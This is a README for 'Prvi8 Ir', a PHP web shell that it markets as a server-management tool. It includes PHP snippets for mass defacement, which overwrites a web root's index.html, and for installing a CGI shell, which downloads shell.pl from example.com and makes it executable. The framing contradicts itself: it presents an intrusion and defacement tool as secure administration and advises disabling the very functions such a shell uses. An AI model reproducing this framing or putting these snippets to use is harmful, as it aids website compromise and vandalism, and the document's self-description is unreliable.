# Prvi8 Ir PHP Web Shell 🛠️

A comprehensive guide and explanation for the PHP web shell script designed for server management, file operations, and extended control features. This tool is powerful and should be used responsibly and ethically.


![Prvi8-Ir-Web-Shell](https://r00t-shell.com/wp-content/uploads/2025/02/Prvi8-Ir-Web-Shell.png)
*Prvi8-Ir-Web-Shell - Prvi8 Ir Web Shell: Explanation and Usage*


## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
  - [File Deletion](#file-deletion)
  - [File Upload](#file-upload)
  - [Mass Defacement](#mass-defacement)
  - [CGI Shell Installation](#cgi-shell-installation)
- [Security Considerations](#security-considerations)
- [Disclaimer](#disclaimer)
- [Conclusion](#conclusion)

## Overview

The **PHP Web Shell** is a script that provides detailed controls to manage your server. It allows for file management, server information retrieval, mass defacement operations, and even the installation of a CGI-based shell. This README.md outlines its features, setup instructions, and important security measures to ensure safe and ethical operation.

## Features

- **Server Information:** Displays critical server details such as operating system, IP address, software versions, and security settings.
- **File Management:** Enables listing, deleting, renaming, editing, and changing file or directory permissions.
- **File Upload:** Provides a secure interface for uploading files to the server.
- **Mass Defacement:** Facilitates copying a specified file to multiple directories to execute a mass defacement (use responsibly).
- **CGI Shell Installation:** Installs a CGI-based shell to extend server control capabilities.
- **Directory and File Creation:** Supports creating new directories and files on the server for flexible management.

## Installation

1. **Upload the Script:** Place the PHP script on your server in a directory accessible via a web browser.
2. **Set Permissions:** Verify that file and directory permissions are correctly set to prevent unauthorized access.
3. **Configure Your Environment:** Disable dangerous PHP functions (e.g., `exec`, `shell_exec`, `system`) to bolster security.
4. **Access via Browser:** Open your web browser and navigate to the script’s URL to get started.

## Usage

The web shell presents a user-friendly interface with various functionalities. Navigate through the options to manage files, view server details, execute a mass defacement, or install a CGI shell.

### File Deletion

```php
if (is_file('file.txt')) {
    unlink('file.txt');
}
```
```php
File Upload
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploaded_file.txt');
}
```
Mass Defacement
```php
$deface_file = 'deface.html';
$target_dir = '/var/www/html/';
copy($deface_file, $target_dir . 'index.html');
```
CGI Shell Installation
```php
$cgi_code = file_get_contents('https://example.com/cgi_shell.pl');
file_put_contents('shell.pl', $cgi_code);
chmod('shell.pl', 0755);
```
Security Considerations
Disable Risky PHP Functions: Functions such as exec, shell_exec, and system should be turned off to reduce potential exploits.
Strict File Upload Controls: Validate all uploads and limit permissions to prevent the execution of harmful scripts.
Use a Firewall: Implement a firewall to monitor traffic and block suspicious activity.
Regular Scans: Conduct periodic security audits and scans to detect and mitigate vulnerabilities.
Disclaimer

Warning: This PHP Web Shell is a powerful tool that can be misused if handled irresponsibly. It is intended solely for educational purposes or for managing servers that you own, or for which you have explicit permission to administer. Unauthorized use is illegal and unethical. Always prioritize security and adhere to legal guidelines when using this tool.

Conclusion

The PHP Web Shell provides extensive functionality for server management with robust features and flexibility. By following the security measures and ethical practices outlined in this document, you can effectively manage server operations without compromising safety. Use this tool responsibly and ensure all activities are conducted in compliance with applicable laws and guidelines.

For further inquiries, bug reports, or contributions, please contact the repository maintainers or refer to the included documentation.
